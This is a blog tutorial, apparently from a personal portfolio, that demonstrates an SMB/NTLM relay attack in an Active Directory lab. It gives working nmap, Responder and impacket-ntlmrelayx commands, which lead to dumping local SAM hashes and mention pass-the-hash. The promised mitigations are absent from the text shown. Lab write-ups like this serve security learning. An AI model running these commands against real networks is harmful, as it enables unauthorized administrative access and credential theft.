---
title: "SMB Relay Attack"
date: "2026-07-01"
summary: "Demonstrating an SMB relay attack in an Active Directory lab by relaying intercepted NTLM authentication to a target system and discussing mitigation techniques."
tags:
  - active-directory
  - smb
  - smb-relay
  - ntlm
  - responder
  - impacket
  - credential-relay
  - mitm
---

## 1. What is SMB?

**Server Message Block (SMB)** is a network file-sharing protocol that enables users and applications to access shared files, printers, and other resources across a network. In Windows environments, SMB commonly uses **NTLM** for authentication.

## 2. How is SMB Vulnerable to Relay Attacks?

SMB is vulnerable because NTLM authentication can be relayed when **SMB signing is not enforced**. An attacker captures a user's authentication attempt and relays it to another vulnerable machine, allowing them to authenticate as the user without knowing the password.

![smb](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/SMB%20Relay%20attack/image1.png?raw=true)

**Requirements for a successful attack:**

* The target must **not enforce SMB signing**.
* The relayed user should have **local administrator** privileges on the target machine.
* The authentication **cannot be relayed back to the same machine** it was captured from.
* By default, many Windows workstations do **not enforce SMB signing**, making them potential relay targets.
* Since the authentication is **relayed rather than cracked**, password complexity does not affect the attack.


## 3. SMB Relay Attack Setup

In this hypothetical environment:

* **Frank Castle (`fcastle`)**, a user in the **MARVEL.local** domain, has **local administrator** privileges on two workstation systems.
* Because these workstations do **not enforce SMB signing** by default, they are susceptible to an **NTLM relay attack**.

### Attack Flow

`1.` The attacker identifies workstation IP addresses that are vulnerable to NTLM relay attacks.
`2.` The attacker configures and starts the required relay infrastructure and supporting tools.

`3.` An authentication event such as one triggered by **LLMNR poisoning** causes a user's NTLM authentication attempt to be captured.

`4.` Instead of cracking the captured hash, the attacker relays the intercepted authentication to a vulnerable workstation.

`5.` Since the relayed user has local administrator privileges on the target machine and SMB signing is not enforced, the authentication succeeds, allowing the attacker to gain unauthorized administrative access to the workstation.

## 4. Exploiting SMB

During an **SMB relay attack**, an attacker captures a valid **NTLM authentication** attempt and relays it to another vulnerable system. Instead of cracking the captured hash, the attacker forwards the authentication to gain unauthorized access to the target workstation using the victim's Active Directory credentials.

### Step 1: Identify Workstations Without SMB Signing Enforced

```bash
nmap --script=smb2-security-mode.nse -p445 192.168.236.0/24
```
![smb](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/SMB%20Relay%20attack/image1.png?raw=true)

The image above shows a workstation where **SMB signing is not enforced**. By default, this is the configuration on most Windows workstations.

Next, we identify all workstations that do not enforce SMB signing and save their IP addresses to a file named **`targets.txt`**. This file will be used as the target list for the relay attack.

### Step 2: Setting Up Attack

For this attack, we will use **Responder** and **ntlmrelayx**. First, configure **Responder** to disable its **SMB** and **HTTP** servers so that captured NTLM authentication requests are forwarded to **ntlmrelayx** for relaying instead of being handled by Responder itself.

```bash
sudo vim /etc/responder/Responder.conf
```
![responder](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/SMB%20Relay%20attack/image2.png?raw=true)

Next, we will launch Responder.

```bash
sudo responder –I eth0 -dw
```
![responder](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/SMB%20Relay%20attack/image3.png?raw=true)

Finally, we will launch ntlmrelayx and wait for an event to occur.

```bash
sudo impacket-ntlmrelayx –tf targets.txt –smb2support
```
![ntlmrelayx](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/SMB%20Relay%20attack/image4.png?raw=true)




### Step 3: Relaying the Captured Authentication

Once the relay infrastructure is in place, the victim is induced to initiate an NTLM authentication request. 

In this demonstration, the victim opens File Explorer and goes to network tab and enters the attacker's IP address in the address bar:

```bash
\\<attacker-ip>
```

![victim](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/SMB%20Relay%20attack/image5.png?raw=true)

This causes the victim to authenticate to the attacker's machine. `Responder` will capture this event, pass it to `ntlmrelayx`, which will relay the credentials to the targets in our targets file.

If the target is vulnerable and the relayed user has the required privileges, the relay succeeds, allowing the attacker to authenticate to the target workstation using the victim's Active Directory credentials.

![ntlmrelayx](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/SMB%20Relay%20attack/image7.png?raw=true)

As shown below, the local SAM password hashes have been successfully dumped from the target workstation. These hashes can be analyzed offline, and if applicable, techniques such as pass-the-hash can be used to authenticate to other systems without recovering the plaintext password.

**Note:** we have not compromised a domain account, nor did we need to. Again, the beauty of relay attacks is that you do not need to ever know the password to pull off the attack. So much for a good password policy!